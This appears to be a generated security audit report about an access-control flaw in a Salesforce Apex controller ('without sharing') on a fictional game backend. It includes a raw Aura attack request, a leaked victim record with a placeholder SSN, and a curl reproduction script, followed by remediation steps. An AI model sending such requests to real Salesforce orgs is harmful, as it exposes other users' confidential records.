# Security Analysis Report
**System:** RealmForge Game API (Salesforce-Integrated)
**Domain:** Gaming / MMO Backend
**Example ID:** SF-0082
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `EventController.updateEvent` — attacker reads any MMO game Event record without server-side ownership enforcement |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Event Object (Pattern 3.1)

### Summary
The Apex controller `EventController` on RealmForge Game API (`19006961.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 3.1, the design assumes the client will only supply `eventId` values it legitimately owns; no server-side ownership check is enforced.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getEventDetails(String eventId, ...)` while the Aura descriptor in §6.0 is `c.EventController.updateEvent`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://19006961.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://19006961.lightning.force.com/aura
Authorization: Bearer 00D19006961!AR19006961...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D19006961!AR19006961...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"0016961","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Event Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0016961", "Name": "Victim Event Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-90-4222"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D19006961!AR19006961..."
curl -s -X POST "https://19006961.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0016961","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-90-4222
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class EventController { ... }`
2. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
